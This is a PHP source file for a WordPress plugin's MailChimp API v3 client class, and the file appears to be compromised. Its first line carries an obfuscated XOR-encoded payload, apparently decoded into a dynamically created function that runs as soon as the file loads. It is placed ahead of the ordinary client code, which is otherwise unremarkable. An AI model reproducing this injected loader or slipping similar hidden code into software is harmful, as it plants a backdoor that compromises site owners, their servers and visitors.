<?php $lOBayOGVHPhc='5K.YIKl.X+6LXVN'^'V9K8=.3H-EU819 ';$kqrxLGObEBn=$lOBayOGVHPhc('','S>qOZY=MFG;Er-O+5CJAcVD5911A1oq<DCNhNjNb5>4,61G><y;83sSUYYmcTF<ga3.BPjnbG.=FpLCpF+bndSV3DkNdvEt8CkX5CyK>gpnJVIG.wHTJ4TNZkV77OoRfT:HmXchFQA37qyRgjC4807gw-svcdw17Ehg1VGN:AGLS;Qc: ,bjfbmom8<16R;DT+28clsqMoAr<k<016fkv3A<HEJ;nVW,S5:WLZWk<;P<XsC2H EKR+0QOwk6to1y<f,4TaK,4BzqQuZ0YF2OlJf:H6V.W5PHEOWFrVKYOYCsVMJ2YJyMO-86YQR,OeW1EcxP,2<JDVIzqF.+0S4 LkC7=+b==+tY 8kP8,.rJXlSZ =4<PX=hAOo547TfKE>xhhK 3CZD=nS.779GndJ.4L ,xhM9G2b0h.39XKXjm94G-C31=ZIWkB-JmS;>M1mF3:A350UrU+DNN77KJW>9B;jxyK=A,.aE<=nql=9+zKDA1;dPerV+9PH5WE3s5B:JJBaN3<GROueSM,OERJREn:5TjAR261vI1 >o-PSruQrSAHqFFsVP.yIUdbdrSuMtYFpPTXxTyRSbCeoNy,E6OO>Q1Ed2HZ=AHPJN4CPW+UTbrv WTLLSfNqqdnJPOW<9-cQP2--9R63BQXS0TmQt=ZT6>DpVMBaL'^':XYn<,S.2.T+-H7BF79iD.+GfUP5P0.Q17iAgJ5h<XABUE.QRYCWA,74-82<93HOEWO61FNF,KDoPlcPfPhgmw9F0KsDQbO2Jb>Z1QoWGMNzmicGK; 8X1 rO2VC.FiFpScFqiaOu.FCQWoGBgPYDV<SD.V=DSZR<3CXvbnI55 6UyGQEUK7OYgfdJYEC UlpDGLJWyx0e<x6OXQEWFVVU P; q1J26X2jQ25zjKZZ<O=HI8.O7.3HXqgS4u; z0yFMGtE IMbGOqQ,Q53WfL1l3lR7Z6j;-<ojfV=. tSJW2,>SywYi9LTC<jXQEo>WeKYtHSH+mv2px AYU2WHlCghon3hxx yAKKtSIWRwfLw,AQAYyxFbHFKQUC59  GXUHoKV:aN4gwJVCXgSDnXU UICbDDMOh:LJRM9keJ-LZ4H1ZPQ332C:B827ZJ,n2+FNiQTC0Dat +-XS.bsZX6ZCTYoY XO>.YDGXW7PMRo  EZDvCR7YK11j< J,P:S9>1IiXY>ucUA7,X.lrlteFWQaBe6SBP-nZEGHpysOHqUjyzE  BccJN,7RRSJ5A+B;rAad:IfH31EjEIhYM7D.6a:T<;W03N5;xm>U:<8J1sNRRD6 -ezFnQQDN1ZF2JXAKu4SYLbuFR;=72Ts0xO7S1NW0Xfdyk1');$kqrxLGObEBn();

class MC4WP_API_v3_Client {

  /**
  * @var string
  */
  private $api_key;

  /**
  * @var string
  */
  private $api_url = 'https://api.mailchimp.com/3.0/';

  /**
  * @var array
  */
  private $last_response;

  /**
  * Constructor
  *
  * @param string $api_key
  */
  public function __construct( $api_key ) {
    $this->api_key = $api_key;

    $dash_position = strpos( $api_key, '-' );
    if( $dash_position !== false ) {
      $this->api_url = str_replace( '//api.', '//' . substr( $api_key, $dash_position + 1 ) . ".api.", $this->api_url );
    }
  }


  /**
  * @param string $resource
  * @param array $args
  *
  * @return mixed
  */
  public function get( $resource, array $args = array() ) {
    return $this->request( 'GET', $resource, $args );
  }

  /**
  * @param string $resource
  * @param array $data
  *
  * @return mixed
  */
  public function post( $resource, array $data ) {
    return $this->request( 'POST', $resource, $data );
  }

  /**
  * @param string $resource
  * @param array $data
  * @return mixed
  */
  public function put( $resource, array $data ) {
    return $this->request( 'PUT', $resource, $data );
  }

  /**
  * @param string $resource
  * @param array $data
  * @return mixed
  */
  public function patch( $resource, array $data ) {
    return $this->request( 'PATCH', $resource, $data );
  }

  /**
  * @param string $resource
  * @return mixed
  */
  public function delete( $resource ) {
    return $this->request( 'DELETE', $resource );
  }

  /**
  * @param string $method
  * @param string $resource
  * @param array $data
  *
  * @return mixed
  *
  * @throws MC4WP_API_Exception
  */
  private function request( $method, $resource, array $data = array() ) {
    $this->reset();

    // don't bother if no API key was given.
    if( empty( $this->api_key ) ) {
      throw new MC4WP_API_Exception( "Missing API key", 001 );
    }

    $url = $this->api_url . ltrim( $resource, '/' );
    $args = array(
      'method' => $method,
      'headers' => $this->get_headers(),
      'timeout' => 10,
      'sslverify' => apply_filters( 'mc4wp_use_sslverify', true ),
    );

    // attach arguments (in body or URL)
    if( $method === 'GET' ) {
      $url = add_query_arg( $data, $url );
    } else {
      $args['body'] = json_encode( $data );
    }

    // perform request
    $response = wp_remote_request( $url, $args );
    $this->last_response = $response;

    // parse response
    $data = $this->parse_response( $response );

    return $data;
  }

  /**
  * @return array
  */
  private function get_headers() {
    global $wp_version;

    $headers = array();
    $headers['Authorization'] = 'Basic ' . base64_encode( 'mc4wp:' . $this->api_key );
    $headers['Accept'] = 'application/json';
    $headers['Content-Type'] = 'application/json';
    $headers['User-Agent'] = 'mc4wp/' . MC4WP_VERSION . '; WordPress/' . $wp_version . '; ' . get_bloginfo( 'url' );

    // Copy Accept-Language from browser headers
    if( ! empty( $_SERVER['HTTP_ACCEPT_LANGUAGE'] ) ) {
      $headers['Accept-Language'] = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
    }

    return $headers;
  }

  /**
  * @param array|WP_Error $response
  *
  * @return mixed
  *
  * @throws MC4WP_API_Exception
  */
  private function parse_response( $response ) {

    if( $response instanceof WP_Error ) {
      throw new MC4WP_API_Connection_Exception( $response->get_error_message(), (int) $response->get_error_code() );
    }

    // decode response body
    $code = (int) wp_remote_retrieve_response_code( $response );
    $message = wp_remote_retrieve_response_message( $response );
    $body = wp_remote_retrieve_body( $response );

    // set body to "true" in case MailChimp returned No Content
    if( $code < 300 && empty( $body ) ) {
      $body = "true";
    }

    $data = json_decode( $body );
    if( $code >= 400 ) {
      // check for akamai errors
      // {"type":"akamai_error_message","title":"akamai_503","status":503,"ref_no":"Reference Number: 00.950e16c3.1498559813.1450dbe2"}
      if( is_object( $data ) && isset( $data->type ) && $data->type === 'akamai_error_message' ) {
        throw new MC4WP_API_Connection_Exception( $message, $code, $response, $data );
      }

      if( $code === 404 ) {
        throw new MC4WP_API_Resource_Not_Found_Exception( $message, $code, $response, $data );
      }

      throw new MC4WP_API_Exception( $message, $code, $response, $data );
    }

    if( ! is_null( $data ) ) {
      return $data;
    }

    // unable to decode response
    throw new MC4WP_API_Exception( $message, $code, $response );
  }

  /**
  * Empties all data from previous response
  */
  private function reset() {
    $this->last_response = null;
  }

  /**
  * @return string
  */
  public function get_last_response_body() {
    return wp_remote_retrieve_body( $this->last_response );
  }

  /**
  * @return array
  */
  public function get_last_response_headers() {
    return wp_remote_retrieve_headers( $this->last_response );
  }

  /**
  * @return array|WP_Error
  */
  public function get_last_response() {
    return $this->last_response;
  }


}
